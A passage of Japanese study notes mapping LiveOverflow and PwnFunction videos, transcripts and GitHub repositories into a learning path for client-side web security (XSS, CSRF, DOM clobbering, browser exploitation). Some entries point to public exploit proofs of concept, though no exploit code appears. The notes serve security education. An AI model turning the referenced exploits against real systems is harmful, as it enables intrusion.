| WebKit RegExp Exploit addrof() | `https://gist.github.com/LiveOverflow/ee5fb772334ec985094f77c91be60492` ／ `https://webkit.org/blog/6411/javascriptcore-csi-a-crash-site-investigation-story/` ／ Linus Henze の exploit `https://github.com/LinusHenze/WebKit-RegEx-Exploit` |
| can you hack this screenshot service?? | `https://github.com/LiveOverflow/ctf-screenshotter` ／ `https://www.cscg.de/` |
| End-to-End Encryption in the Browser Impossible? | Nadim Kobeissi, "An Analysis of the ProtonMail Cryptographic Architecture" `https://eprint.iacr.org/2018/1121` |
| Crazy Steam Phishing Page | `https://phishingquiz.withgoogle.com/` |

---

## 15. 補完で判明した追加の関連動画（本ノート初出）
（出典: `liveoverflow_videos.jsonl`。1-3〜1-6 の表に**無かった**が、クライアントサイド学習に関連する動画）

| タイトル | 投稿日 | 再生数 | video_id | 関連性 |
| --- | --- | --- | --- | --- |
| Crazy Steam Phishing Page | 2021-07-17 | 154,379 | NWtm4X6L_Cs | **「ブラウザのアドレスバーだけが信頼できる唯一のセキュリティ指標」**を実演。フィッシング・UI偽装（偽ブラウザウィンドウ等）の回。関連: `https://phishingquiz.withgoogle.com/` |
| †: Some things I got wrong with JS Safe 2.0 - Google CTF 2018 | 2018-06-29 | 20,967 | J2XS3m2Ctuc | 前日公開のJS crackme動画の**訂正回**。「間違いを公開で訂正する」姿勢の実例 |
| Analysing a Firefox Malware browserassist.dll - FLARE-On 2018 | 2019-02-24 | 246,580 | 5cvpGSSUZI0 | ブラウザに寄生するマルウェア解析（クライアントサイドの別側面） |
| RSA Implemented in JavaScript (Keygen part 5) - Pwn Adventure 3 | 2018-09-04 | 39,153 | 2pqHsW3yNlA | クライアント側JSに暗号処理を置くことの意味 |
| The Origin of Script Kiddie - Hacker Etymology | 2019-05-12 | 140,931 | 3MAqlEMITzw | Hacker Etymologyシリーズ（`The Origin of XSS` と同系列） |
| Injection Vulnerabilities - or: How I got a free Burger | 2017-07-28 | 380,983 | WWJTsKaJT_g | **インジェクションの本質**（「データと命令の混同」）を、フードデリバリの注文コメントがハンバーガーとして調理された実話で説明。XSS/SQLi/コマンドインジェクションの導入に最適 |
| Reverse Engineering PopUnder Trick for Chrome | 2017-08-11 | 81,418 | PPzRcZLNCPY | 難読化JS解析の続編（Chrome 60のPopUnder、Chromiumバグ2件） |
| Pentesting vs. Bug Bounty vs. Pentesting ??? | 2021-05-15 | 75,339 | sXThugPk_zA | 進路・働き方の回 |
| How To Learn Hacking With CTFs | 2019-12-08 | 221,025 | Lus7aNf2xDg | 学習法の回 |
| Guessing vs. Not Knowing in Hacking and CTFs | 2020-10-18 | 59,755 | L1RvK1443Yw | 「推測」と「未知」の区別＝研究姿勢 |

---

## 読者が自分で開くべき資料

対象2つのYouTube URL（`youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w` と `youtube.com/c/PwnFunction/videos`）は本環境のegressポリシーでプロキシに遮断され、直接視聴・スクレイプができなかった。以下は読者が自分のブラウザで開いた際の読みどころ。

**LiveOverflow チャンネル（youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w、または `@LiveOverflow`）の読みどころ**:
1. 再生リスト「Web Hacking / web 0xNN」を通しで視聴（`web 0x00`〜`0x05`）— HTML/HTTP/PHP/XSSコンテキスト/CSRF/SOP/Confused Deputy の基礎を順に。
2. 再生リスト「The History of XSS」— SOP誕生（1995）〜Universal XSS〜XSS語源。クライアントサイド脆弱性の"なぜ"を歴史から理解。
3. 単発の名作: `XSS on Google Search - Sanitizing HTML in The Client?`（lG7U3fuNw3A）、`DO NOT USE alert(1) for XSS`（KHwVjzWei1c）、`Fuzzing Browsers for weird XSS Vectors`（yq_P3dzGiK4）、`Missing HTTP Security Headers`（064yDG7Rz80）。
4. 深掘り志望者向け: 「browser 0xNN」シリーズ（WebKit/JavaScriptCore exploit、`addrof()`/`fakeobj()`）。
5. 研究プロセスの学び方: `How did Masato find the Google Search XSS?`、`Failed DOM Clobbering Research` で「失敗を含む思考過程」を観察。
6. 検索キーワード（YouTube内検索用）: `LiveOverflow web 0x00`、`LiveOverflow XSS AngularJS`、`LiveOverflow DOM clobbering`、`LiveOverflow browser exploitation`、`LiveOverflow same origin policy history`。

**PwnFunction チャンネル（youtube.com/c/PwnFunction/videos、`@PwnFunction`）の読みどころ**:
1. 脆弱性クラス「Explained」動画を最初に: `Cross-Site Scripting (XSS) Explained`（EoaDgUgS6QA）、`Cross-Site Request Forgery (CSRF) Explained`（eWEgUcHPle0）、`Insecure Direct Object Reference (IDOR) Explained`（rloqMGcPMkI）、`Open Redirect Vulnerability Explained`（4Jk_I-cw4WE）、`HTTP Parameter Pollution Explained`（QVZBl8yxVX0）、`XML External Entities (XXE) Explained`（gjm6VHZa_8s）、`Server-Side Template Injections Explained`（SN6EVIG4c-0）、`Insecure Deserialization Attack Explained`（jwzeJU_62IQ）。
2. DOM Clobbering入門の定番: `Solving a Hard Google CTF challenge - "Paste-tastic!"`（2up8J9dErHI）。特に `?t=797`（13:17）以降。
3. モダンJS特有のバグ: `When You Use One Wrong Javascript Module`（XS_UMqQalLI、Prototype Pollution）、`How To Predict Random Numbers Generated By A Computer`（-h_rj2-HP2E、`Math.random`予測）。
4. Web技術アプリの拡張攻撃面: `Hacking Electron Applications`（jkJWA_CWrQs）。
5. 手を動かす: 公式DOM XSSゲーム `https://xss.pwnfunction.com/`（Warmups 8＋Challenges 6）。ソースは GitHub `PwnFunction/xss.pwnfunction.com`（Hugoコンテンツ＋公式解説）と `PwnFunction/sandbox.pwnfunction.com`（実チャレンジHTML）。関連repo: `PwnFunction/Next.js-Flat-Prototype-Pollution`、`PwnFunction/v8-randomness-predictor`。
6. 検索キーワード: `PwnFunction XSS explained`、`PwnFunction CSRF`、`PwnFunction DOM clobbering pastetastic`、`PwnFunction prototype pollution`、`xss.pwnfunction.com`。

**入手できた一次データの所在（本ノートの根拠）**:
- `https://github.com/LiveOverflow/yt_statistics`（README、`liveoverflow_videos.jsonl`、`all_videos.jsonl`。LiveOverflow本人が公開する各セキュリティ系YouTuberの動画メタデータ。取得日 2023-03-15）。
- `https://github.com/PwnFunction/xss.pwnfunction.com`（`hugo/content/warmups/*.md`、`hugo/content/challenges/*.md`＝公式解説）。
- `https://github.com/PwnFunction/sandbox.pwnfunction.com`（`warmups/*.html`、`challenges/*.html`＝実チャレンジソース）。

〔補足（一般知識）〕`yt_statistics` の `all_videos.jsonl` には他の28チャンネル（JohnHammond, IppSec, 0xdf, NahamSec, STÖK, Bug Bounty Reports Explained, InsiderPhD, Farah Hawa, codingo, hakluke 等）のデータも含まれる。これらは本ノートの担当（LiveOverflow/PwnFunction）外だが、章10の「その他のクライアントサイド学習チャンネル」候補として教科書側で参照可能。

---

### ［補完ラウンド追記］読者向けガイドの強化

#### A. YouTubeを開けない/開きたくない読者への最良の代替 — 全動画の逐語トランスクリプト

**LiveOverflowの全336本については、動画を見なくても内容を文字で読める。**

- `git clone https://github.com/LiveOverflow/yt_statistics`
- `liveoverflow_transcripts/<video_id>.txt` が各動画の字幕本文。`liveoverflow_videos.jsonl` でタイトル→`video_id` を引く。
- 例: XSSコンテキスト回を読むなら `liveoverflow_transcripts/8GwVBpTgR2c.txt`。
- 便利なコマンド例（本ノート作成時に使用）:

```bash
git clone --depth 1 https://github.com/LiveOverflow/yt_statistics
cd yt_statistics
# タイトルで動画IDを探す
python3 -c "
import json
for l in open('liveoverflow_videos.jsonl'):
    v=json.loads(l)
    if 'XSS' in v['title']: print(v['video_id'], v['date'][:10], v['title'])
"
# 本文を読む
less liveoverflow_transcripts/lG7U3fuNw3A.txt
# 全トランスクリプト横断grep（例: DOM Clobbering に言及する動画を探す）
grep -ril "clobber" liveoverflow_transcripts/
```

- **限界**: トランスクリプトは音声のみ。画面録画で示されるコード・DOMツリー・デベロッパーツールの画面は文字になっていない。`this`, `here`, `look at this` といった指示語が多いので、**細部まで理解したい回は必ず動画を見ること**。また **データは2023-03-15時点**なので、それ以降の動画は含まれない。
- 注意: トランスクリプト/メタデータは**チャンネル所有者本人が公開・利用を許諾しているデータ**（README: "Feel free to use the data to create some statistics"）。

#### B. LiveOverflow — 学習順序の推奨（本ノートの内容に基づく具体案）

1. **導入**: `Injection Vulnerabilities - or: How I got a free Burger`（WWJTsKaJT_g）でインジェクションの本質（データと命令の混同）を掴む。
2. **土台**: `web 0x00`→`0x01`→`0x02`→`0x03`→`0x04`→`0x05` を順に。
   - 特に `web 0x03`（8GwVBpTgR2c）で**4つの出力コンテキスト**、`web 0x04`（KaEj_qZgiKY）で**SOPは読み取りだけを止める**という非対称性、`web 0x05`（Yfsmc0b8o78）で**Confused Deputy**という理論的支柱を得る。
3. **歴史**: 再生リスト `The History of XSS` → `https://www.youtube.com/playlist?list=PLhixgUqwRTjyakFK7puB3fHVfXMinqMSi`（SOP誕生1995 → Universal XSS → XSSの語源）。
4. **実務判断**: `DO NOT USE alert(1) for XSS`（KHwVjzWei1c）と `Missing HTTP Security Headers`（064yDG7Rz80）。**「何が脆弱性で、何が脆弱性でないか」を学べる数少ない教材**。Google VRP向け再生リスト `https://www.youtube.com/playlist?list=PLY-vqlMAnJ9bGoI82H1BB8BE4A8H2OCA-` も併せて。
5. **核心研究**: `XSS on Google Search`（lG7U3fuNw3A）＝mXSS／クライアントサイドサニタイズ。続けて `How did Masato find the Google Search XSS?`（gVrdE6g_fa8）、`Fuzzing Browsers for weird XSS Vectors`（yq_P3dzGiK4）。
6. **総合演習**: `Pasteurize`（Tw7ucd2lKBk）→ `All The Little Things 1/2`（dZXaQKEE3A8）→ `2/2`（UGtrpXk6QVU）。DOM Clobbering・`window.name`・prototype上書き・JSONP script gadget・`srcdoc` CSPバイパスが一気に学べる。
7. **深掘り（任意）**: `browser 0x00`（5tEdSoZ3mmE）以降のJavaScriptCore/WebKit exploitシリーズ。

#### C. PwnFunction — 依然として「部分取得」のままのもの

PwnFunctionについては、**動画の本文（トランスクリプト）は入手できていない**。`LiveOverflow/yt_statistics` の `all_videos.jsonl` は他チャンネル分については **title / published / views / likes / comments / tags のみ**で、`description` も `transcript` も含まない（補完ラウンドで全フィールドを確認済み: `['channel','channel_id','comments','likes','published','tags','thumbnail','title','video_id','views']`）。

**読者が自分で開くべき理由と読みどころ**:

| 動画 | URL | 何を学ぶために見るか（具体的に） |
| --- | --- | --- |
| Cross-Site Scripting (XSS) Explained | `https://www.youtube.com/watch?v=EoaDgUgS6QA` | XSSの3分類（Reflected / Stored / DOM-based）と「なぜ危険か」をアニメーションで一気に掴む。LiveOverflow `web 0x03` の前に見ると理解が速い |
| Cross-Site Request Forgery (CSRF) Explained | `https://www.youtube.com/watch?v=eWEgUcHPle0` | CSRFの攻撃フロー図解。LiveOverflow `web 0x04` の実演と対にして見る |
| Solving a Hard Google CTF challenge - "Paste-tastic!" | `https://www.youtube.com/watch?v=2up8J9dErHI` （`?t=797` ＝13:17 から） | **DOM Clobbering の定番入門**。本ノート13節の All The Little Things を読む前の前提知識として最適 |
| Open Redirect Vulnerability Explained | `https://www.youtube.com/watch?v=4Jk_I-cw4WE` | オープンリダイレクトが単体では低深刻度でも、SSRF/XSS/フィッシングと連鎖して効く理由（タグに `ssrf, xss, phishing` が入っている） |
| HTTP Parameter Pollution Explained | `https://www.youtube.com/watch?v=QVZBl8yxVX0` | パラメータの重複・型混同。本ノート12節の Pasteurize（`qs` の `extended: true` によるオブジェクト化）と同じ根の問題 |
| When You Use One Wrong Javascript Module | `https://www.youtube.com/watch?v=XS_UMqQalLI` | npmモジュール由来の **Prototype Pollution**。コードは `https://github.com/PwnFunction/Next.js-Flat-Prototype-Pollution` で読める |
| How To Predict Random Numbers Generated By A Computer | `https://www.youtube.com/watch?v=-h_rj2-HP2E` | V8 の `Math.random` が予測可能であること（＝トークン生成に使ってはいけない理由）。コードは `https://github.com/PwnFunction/v8-randomness-predictor` |
| Hacking Electron Applications | `https://www.youtube.com/watch?v=jkJWA_CWrQs` | Web技術で作られたデスクトップアプリで XSS が RCE に昇格する経路 |
| This Website has No Code — or Does it? | `https://www.youtube.com/watch?v=msdymgkhePo` | 「コードが無いように見えるページ」に仕込まれたコード。ソースは `https://github.com/PwnFunction/Blank-Rick-Roll` |

- **自動取得できない理由**: `www.youtube.com` が組織のegressポリシーで遮断されており、Invidious/Piped等のミラー、`web.archive.org`、`r.jina.ai` も同様に遮断。WebSearchもセッション予算を使い切っている。**この環境からは動画本文を取得する手段が存在しない**。
- **代替手段（読者が自分でやる場合）**:
  - YouTube の「文字起こしを表示」（動画下の … メニュー → Show transcript）で全文を読める。
  - `yt-dlp --write-auto-sub --skip-download <URL>` で字幕だけ取得できる。
  - **動画を見なくても学べる部分**: XSSゲーム `https://xss.pwnfunction.com/` の全チャレンジソースと公式解説は、本ノート3節に**逐語で収録済み**（`PwnFunction/xss.pwnfunction.com` と `PwnFunction/sandbox.pwnfunction.com` から取得）。まずはここを手で解くのが最も効率がよい。

#### D. PwnFunction の近年の活動（GitHubリポジトリ一覧から判明、2026-09時点）

`all_videos.jsonl` は2023年3月までのデータなので、それ以降の動画は本ノートに含まれない。**GitHub公開リポジトリの更新状況からは、近年はセキュリティ動画よりソフトウェア/AI寄りに軸足が移っていることが読み取れる**（出典: GitHub検索API `user:PwnFunction`、2026-09-18取得）。

| リポジトリ | 説明（逐語） | 作成 | ★ |
| --- | --- | --- | --- |
| `PwnFunction/sandbox` | `Run untrusted AI code safely, fast` | 2025-12 | 197 |
| `PwnFunction/one-billion-rows` | `Processes 1 billion rows of temperature data to compute min/avg/max per city. No external crates used.` | 2025-12 | 9 |
| `PwnFunction/celect` | `A tiny yet pretty fast columnar SQL query engine for CSV files.` | 2025-11 | 4 |
| `PwnFunction/rizz-python` | `A python transpiler for rizzlers.` | 2025-02 | 56 |
| `PwnFunction/chip8` | `chip8 vm implementation in js with a debugger` | 2024-01 | 2 |
| `PwnFunction/v8-randomness-predictor` | `Using z3 to predict Math.random in v8` | 2022-06 | 348 |
| `PwnFunction/learn-z3` | `Some challenge solutions solved using z3` | 2022-05 | 236 |
| `PwnFunction/CVE-2021-4034` | `Proof of concept for pwnkit vulnerability` | 2022-01 | 352 |
| `PwnFunction/xss.pwnfunction.com` | `DOM XSS Game` | 2021-12 | 96 |
| `PwnFunction/sandbox.pwnfunction.com` | `DOM XSS challenges for xss.pwnfunction.com` | 2021-12 | 8 |
| `PwnFunction/Next.js-Flat-Prototype-Pollution` | `Prototype Pollution using flat with Next.js` | 2021-11 | 108 |
| `PwnFunction/Blank-Rick-Roll` | `Rick Roll website that has hidden code.` | 2021-06 | 404 |

**注意**: これはリポジトリのメタデータであり、**チャンネルに新しい動画が出たかどうかは確認できていない**。読者は `https://www.youtube.com/c/PwnFunction/videos` を自分で開いて最新状況を確認すること。なお `xss.pwnfunction.com` リポジトリは**2026-09-16にも更新されており**、教材としては維持されている（ただしREADMEの「非メンテ、後継はHackerCamp.co」という注記は本ノート3節に収録済み）。

#### E. LiveOverflow の他リポジトリ（読者が手を動かせる素材、2026-09時点）

出典: GitHub検索API `user:LiveOverflow`（2026-09-18取得）。

| リポジトリ | 説明（逐語） | ★ | 本章との関係 |
| --- | --- | --- | --- |
| `LiveOverflow/liveoverflow_youtube` | `Material for the YouTube series` | 521 | 動画用の素材。ただし実体は `0x05_simple_crackme_intro_assembler` / `0x07_0x08_uncrackable_crackme` / `0x10` / `0x21_0x23_modern_stack0` の4ディレクトリ＋README で、**binシリーズ中心。web系の素材は含まれない**（補完ラウンドでclone確認） |
| `LiveOverflow/yt_statistics` | `Data pulled from YouTube Security Creators` | 16 | **本ノートの主要な一次情報源**。全336本のトランスクリプト同梱 |
| `LiveOverflow/ctf-screenshotter` | `a CTF web challenge about making screenshots` | 224 | 動画 `can you hack this screenshot service??`（FCjMoPpOPYI）の課題本体。**自分で建てて解ける** |
| `LiveOverflow/ctf-cryptowaf` | `Amazing CryptoWAF was a CTF challenge for ALLES! CTF 2021` | 34 | 自作Web課題 |
| `LiveOverflow/security-research` | `Security Research` | 39 | 研究メモ |
| `LiveOverflow/webp-CVE-2023-4863` | （説明なし。JavaScript） | 56 | 2023年のlibwebp 0-day（**2023-03のデータには無い、より新しい活動**） |
| `LiveOverflow/everything-api` | （説明なし。Python） | 47 | — |
| `LiveOverflow/minecraft-hacked` | `Minecraft:Hacked is a video series exploring various technical areas of Minecraft.` | 215 | Web以外の主要シリーズ |
| `LiveOverflow/pwnedit` | `CVE-2021-3156 - Sudo Baron Samedit` | 225 | Web以外 |
| `LiveOverflow/log4shell` | `Small example repo for looking into log4j CVE-2021-44228` | 72 | Web以外 |
| `LiveOverflow/PwnAdventure3` | `PwnAdventure3 Server` | 685 | ゲームハッキング |

#### F. 本ノートで依然として未取得の情報（読者が自分で確認すべきもの）

1. **両チャンネルの登録者数・総再生数・チャンネル開設日**（YouTubeページ上にしかない。SocialBlade等も遮断）。
2. **2023年3月16日以降に公開された動画**（データセットの取得日以降）。LiveOverflowは `webp-CVE-2023-4863` リポジトリ（2023-12作成）の存在から、少なくともその後も活動している。
3. **現在の再生リスト構成**（本ノートに載せた再生リストURLは動画説明欄由来で実在するが、中身の現況は未確認）。
4. **PwnFunctionの動画本文**（C節参照）。
5. **動画内の画面録画で示されるコード・DOMツリー・デベロッパーツール画面**（トランスクリプトは音声のみ）。
6. **`Arbitrary Read and Write in WebKit Exploit`（browser 0x08相当）の実在**。1-5節の訂正注記を参照。データセットには存在しない。
